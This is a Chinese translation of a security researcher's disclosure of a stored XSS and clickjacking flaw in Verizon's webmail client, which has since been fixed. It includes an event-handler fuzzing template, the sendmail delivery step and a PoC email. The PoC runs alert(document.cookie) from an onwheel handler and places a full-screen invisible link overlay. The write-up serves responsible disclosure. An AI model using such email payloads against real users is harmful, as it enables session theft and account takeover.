> 原文链接: https://www.anquanke.com//post/id/85140 


# 【技术分享】Verizon的Webmail客户端存储型XSS漏洞


                                阅读量   
                                **78669**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：randywestergren.com
                                <br>原文地址：[https://randywestergren.com/persistent-xss-verizons-webmail-client/](https://randywestergren.com/persistent-xss-verizons-webmail-client/)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p2.ssl.qhimg.com/t017e90f60e757a3554.png)](https://p2.ssl.qhimg.com/t017e90f60e757a3554.png)

****

翻译：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：160RMB（不服你也来投稿啊！）

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**写在前面的话**



在此之前，我曾经专门写过一篇技术文章来详细讲解过[Verizon Webmial客户端](https://mail.verizon.com/)的服务器端漏洞【[文章传送门](https://randywestergren.com/critical-vulnerability-compromising-verizon-email-accounts/)】。但是我最近又在这个客户端中发现了一些非常有意思的漏洞，这些漏洞将允许攻击者入侵目标用户的整个电子邮箱账号。因此，我打算在这篇文章中分析一下这两个存在于Verizon Webmail客户端中的XSS漏洞和点击劫持漏洞。

**存储型XSS漏洞**



存储型 XSS 通常也叫做“持久型 XSS”，它与反射型 XSS 最大的区别就是攻击脚本能永久存储在目标服务器数据库或文件中。这种 XSS 具有很强的稳定性。比较常见的一个场景就是，恶意攻击者将包含有恶意 JavaScript 代码文章发表在热点博客或论坛，吸引大量的用户进行访问，所有访问该文章的用户，恶意代码都会在其客户端浏览器运行安装。

[![](https://p0.ssl.qhimg.com/t01756500bccc48d48b.png)](https://p0.ssl.qhimg.com/t01756500bccc48d48b.png)

黑客把恶意的脚本保存在服务器端，所以这种 XSS 攻击就叫做“存储型 XSS”。相比于反射型 XSS，存储型 XSS 可以造成多种危害巨大的攻击。因为恶意攻击者只需要将恶意脚本保存在服务器端，就可以进行多次攻击。

**点击劫持**



点击劫持也被称为UI-覆盖攻击，它可以通过覆盖不可见的框架元素来误导目标用户去点击访问恶意内容。这种攻击利用了HTML中某些标签或元素的透明属性，虽然目标用户点击的是他所看到的内容，但其实他点击的是攻击者精心构建的另一个覆盖于原网页上的透明页面。点击劫持技术可以通过嵌入代码或者文本的形式出现，攻击者可以在用户毫不知情的情况下完成攻击，比如点击一个表面显示是“播放”某个视频的按钮，而实际上完成的操作却是将用户的社交网站个人信息改为“公开”状态。

**技术分析**



在开始分析之前，让我们先来看一看Webmail客户端所支持的HTML元素／属性。虽然还有很多其他更好的方法来识别这些网页属性，但是我打算生成了一个列表，并且将Webmail客户端中所有有效的HTML元素和每一个可能存在的属性都保存在里面。点击【[这里](https://gist.github.com/rwestergren/63e51daaf9cf64c44d0b20eca530433e)】获取完整的文件，下面给出的是一个简单的样本：

```
&lt;figure onafterprint="console.log(244599)" onbeforeprint="console.log(309354)"
onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)"
onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)"
ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)"
onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)"
onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)"
oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)"
oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)"
onselect="console.log(942035)" onsubmit="console.log(603589)" onkeydown="console.log(650647)"
onkeypress="console.log(579383)" onkeyup="console.log(821763)" onclick="console.log(284098)"
ondblclick="console.log(477370)" ondrag="console.log(439095)" ondragend="console.log(546684)"
ondragenter="console.log(197257)" ondragleave="console.log(238440)" ondragover="console.log(783418)"
ondragstart="console.log(773843)" ondrop="console.log(436878)" onmousedown="console.log(153386)"
onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)"
onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)"
onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)"
onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)"
oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)"
ondurationchange="console.log(455721)" onemptied="console.log(923165)"
onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)"
onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)"
onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)"
onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)"
onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)"
ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)"
onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)"
ontoggle="console.log(739568)" accesskey="test3617" contenteditable="test3617"
contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617"
dropzone="test3617" hidden="test3617" id="test3617" spellcheck="test3617"
style="display:block" tabindex="test3617" title="test3617" translate="test3617"&gt;Test&lt;/figure&gt;

&lt;footer onafterprint="console.log(244599)" onbeforeprint="console.log(309354)"
onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)"
onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)"
ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)"
onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)"
onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)"
oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)"
oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)"
onselect="console.log(942035)" onsubmit="console.log(603589)" onkeydown="console.log(650647)"
onkeypress="console.log(579383)" onkeyup="console.log(821763)" onclick="console.log(284098)"
ondblclick="console.log(477370)" ondrag="console.log(439095)" ondragend="console.log(546684)"
ondragenter="console.log(197257)" ondragleave="console.log(238440)" ondragover="console.log(783418)"
ondragstart="console.log(773843)" ondrop="console.log(436878)" onmousedown="console.log(153386)"
onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)"
onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)"
onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)"
onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)"
oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)"
ondurationchange="console.log(455721)" onemptied="console.log(923165)"
onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)"
onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)"
onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)"
onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)"
onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)"
ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)"
onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)"
ontoggle="console.log(739568)" accesskey="test3617" contenteditable="test3617"
contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617"
dropzone="test3617" hidden="test3617" id="test3617" spellcheck="test3617"
style="display:block" tabindex="test3617" title="test3617" translate="test3617"&gt;Test&lt;/footer&gt;
```

接下来，将一封包含HTML代码的电子邮件发送给我自己的Verizon邮箱，然后在HTML的body中嵌入我们的payload：

```
[user@rw verizon-poc]$ head email.txt | less
Content-Type: text/html;
Subject: Testing the new email

&lt;a onafterprint="console.log(244599)" onbeforeprint="console.log(309354)"
onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)"
onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)"
ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)"
onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)"
onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)"
oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)"
oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)"&gt;Test&lt;/a&gt;

&lt;!-- Snipped --&gt;
```

```
[user@rw verizon-poc]$ sendmail -t ***REMOVED***@verizon.net &lt; ./email.txt
```

邮件发送成功之后，我登录进我的Verizon邮箱，然后打开这封电子邮件。具体如下图所示：

[![](https://p4.ssl.qhimg.com/t01a44c512248c0a2f0.png)](https://p4.ssl.qhimg.com/t01a44c512248c0a2f0.png)

打开了这封邮件之后，我们再打开Chrome浏览器的开发模式控制台（console），然后看一看相应的HTML元素和属性。在分析的过程中，我突然注意到了几个非常有意思的属性，正是这几个属性让这封包含恶意payload的电子邮件顺利绕过了邮件系统的过滤器。其中，影响最大的两个HTML属性为“onwheel”和“oninput”。除此之外，我还发现邮件系统并没有对“style”属性中的内容进行过滤处理。这样一来，攻击者就可以利用这个属性来对目标用户进行[点击劫持攻击](https://en.wikipedia.org/wiki/Clickjacking)和其他类型的恶意攻击了。

为了向大家演示整个漏洞利用的过程，也可以说是为了确定漏洞的可利用性，我设计了一个漏洞利用PoC，并且在这个payload中利用了两个邮件客户端的漏洞。相关代码如下所示：

```
Content-Type: text/html;
Subject: PoC

Verizon Webmail PoC - Move scrollwheel to trigger the XSS payload.
Note the overlay anchor that also demonstrates the clickjacking vulnerability.
&lt;a href="https://en.wikipedia.org/wiki/Clickjacking" onwheel="alert(document.cookie)"
style="position:fixed;top:0;left:0;width:100%;height:100%;"&gt;&lt;/a&gt;
&lt;br&gt;
&lt;br&gt;
&lt;!-- Snipped --&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;div style="font-size:72px"&gt;
An interesting message here to entice the user to scroll down.
&lt;/div&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;!-- Snipped --&gt;
&lt;br&gt;
&lt;br&gt;
```

我将这个新的payload嵌入在电子邮件中，然后发送给我自己的电子邮箱中，并在Webmail客户端中打开了这封邮件。我们可以从下面这张图片中看到，其中的XSS payload已经被成功触发了：

[![](https://p2.ssl.qhimg.com/t018adde82ce7a85c60.png)](https://p2.ssl.qhimg.com/t018adde82ce7a85c60.png)

请大家仔细看看上面所给出的PoC代码，锚点（“&lt;a&gt;标签”）中的style属性将整个弹窗变成了一个可点击的覆盖页面。这也就意味着，无论这个XSS payload是否是由鼠标滚轮的滚动动作所触发的，其中锚点元素的覆盖物都可以让用户在毫不知情的情况下点击攻击者提供的恶意链接。

**漏洞时间轴**



2016年03月28日：漏洞报告给了Verizon，并提供了相应的漏洞PoC。

2016年04月21日：XSS漏洞成功修复，点击劫持漏洞仍未修复。

2016年04月21日：我向提出Verizon建议，限制style属性的使用以缓解点击劫持攻击所带来的影响。

2016年04月25日：点击劫持漏洞成功修复。

**总结**



Verizon电子邮件客户端中的这个持久型（存储型）XSS漏洞是非常危险的，因为攻击者可以直接将恶意payload发送给目标用户，而且在payload被执行之前，攻击者已经获取到了用户的身份认证数据，因此payload的执行将不会受到任何的限制。虽然很多XSS漏洞在利用之前还需要攻击者进行大量的准备工作，但是这个XSS漏洞只要求用户打开一个攻击者精心制作的电子邮件即可（滚动鼠标的滚轮，即可触发恶意payload）。再配合上这个点击劫持漏洞，攻击者就可以利用这两个漏洞轻松高效地对目标用户发动攻击了。


